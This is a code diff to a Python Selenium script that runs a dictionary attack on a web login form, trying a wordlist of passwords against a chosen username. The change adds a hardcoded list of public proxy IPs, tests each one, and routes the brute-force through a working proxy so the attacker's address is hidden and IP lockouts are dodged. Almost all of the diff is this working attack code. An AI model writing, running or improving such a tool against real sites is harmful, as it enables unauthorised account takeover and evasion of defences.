@@ -6,6 +6,7 @@ import time
 import os
 from selenium import webdriver
 from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.common.proxy import Proxy, ProxyType
 import argparse
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
@@ -81,34 +82,58 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
         sys.exit(color.RED+'\n[!] '+ 'Keyboard interrupt'+color.END)
     else:
         pass
-    optionss = webdriver.ChromeOptions()
-    optionss.add_argument("--disable-popup-blocking")
-    optionss.add_argument("--disable-extensions")
-    optionss.add_argument("--incognito")
-    driver = webdriver.Chrome(service = Service(chromedriver))
-    print (color.GREEN+'\n[*] Starting dictionary attack against '+color.YELLOW+username+color.GREEN+' with a '+color.YELLOW+delay+color.GREEN+' seconds delay'+color.END)
-    with open(word_list, 'r') as f:
-        for passwd in f:
-            print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
-            try:
-                driver.get(url)
-                Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
-                Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
-                driver.find_element(By.CSS_SELECTOR, button_sel)
-                Sel_user.send_keys(username)
-                Sel_pas.send_keys(passwd+"\n")
-                time.sleep(int(delay))
-                final_pass = passwd
-                if not driver.find_element(By.CSS_SELECTOR, usr_sel).is_displayed():
-                    sys.exit(color.GREEN+'\nPossible Password found: '+color.RED+final_pass+color.RED+'\n[!] It\'s possible that there was a timeout and the password found is not the correct one.'+color.END)
-            except NoSuchElementException as E:
-                if final_pass == None:
-                    sys.exit(color.RED+f'\n[+] An error occured: [ {E} ]'+color.END)
-                else:
-                    sys.exit(color.GREEN+'\nPossible Password found: '+color.RED+final_pass+color.RED+'\n[!] It\'s possible that there was a timeout and the password found is not the correct one.'+color.END)
-            except KeyboardInterrupt:
-                sys.exit(color.RED+'\n[!] User interrupt'+color.END)
-    sys.exit(color.RED+'\n[-] Password not found'+color.END)
+    
+    proxy_list = [
+        {'http':'http://45.238.220.1:8181'},
+        {'http':'http://124.105.180.29:8082'},
+        {'http':'http://152.230.8.186:999'},
+        {'http':'http://195.224.107.165:8080'},
+        {'http':'http://192.236.160.186:80'},
+        {'http':'http://62.204.197.206:80'}, 
+        {'http':'http://202.180.54.97:8080'},
+        {'https': 'https://122.129.84.12:8080'},
+        {'http': 'http://103.88.237.24:8080'}
+    ]
+    
+    for p in proxy_list:
+        try:
+            r = requests.get(list(p.keys())[0]+'://icanhazip.com', proxies=p, timeout=9)
+            if r.ok:
+                print(color.GREEN+f"Switching to proxy {r.content.decode('utf-8')}"+color.END)
+                optionss = webdriver.ChromeOptions()
+                optionss.add_argument(f"--proxy-server={list(p.values())[0]}")
+                optionss.add_argument("--disable-popup-blocking")
+                optionss.add_argument("--disable-extensions")
+                optionss.add_argument("--incognito")
+                driver = webdriver.Chrome(service = Service(chromedriver), options=optionss)
+                print (color.GREEN+'\n[*] Starting dictionary attack against '+color.YELLOW+username+color.GREEN+' with a '+color.YELLOW+delay+color.GREEN+' seconds delay'+color.END)
+                with open(word_list, 'r') as f:
+                    for passwd in f:
+                        print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
+                        try:
+                            driver.get(url)
+                            Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
+                            Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
+                            driver.find_element(By.CSS_SELECTOR, button_sel)
+                            Sel_user.send_keys(username)
+                            Sel_pas.send_keys(passwd+"\n")
+                            time.sleep(int(delay))
+                            final_pass = passwd
+                            if not driver.find_element(By.CSS_SELECTOR, usr_sel).is_displayed():
+                                sys.exit(color.GREEN+'\nPossible Password found: '+color.RED+final_pass+color.RED+'\n[!] It\'s possible that there was a timeout and the password found is not the correct one.'+color.END)
+                        except NoSuchElementException as E:
+                            if final_pass == None:
+                                sys.exit(color.RED+f'\n[+] An error occured: [ {E} ]'+color.END)
+                            else:
+                                sys.exit(color.GREEN+'\nPossible Password found: '+color.RED+final_pass+color.RED+'\n[!] It\'s possible that there was a timeout and the password found is not the correct one.'+color.END)
+                        except KeyboardInterrupt:
+                            sys.exit(color.RED+'\n[!] User interrupt'+color.END)
+                sys.exit(color.RED+'\n[-] Password not found'+color.END)
+        except (requests.exceptions.ConnectTimeout, requests.exceptions.ProxyError, requests.exceptions.ReadTimeout):
+            print(color.RED+f"Proxy {p['http']} not available"+color.END)
+            pass
+    
+    
 
 def banner():
     banner = color.BOLD+'''
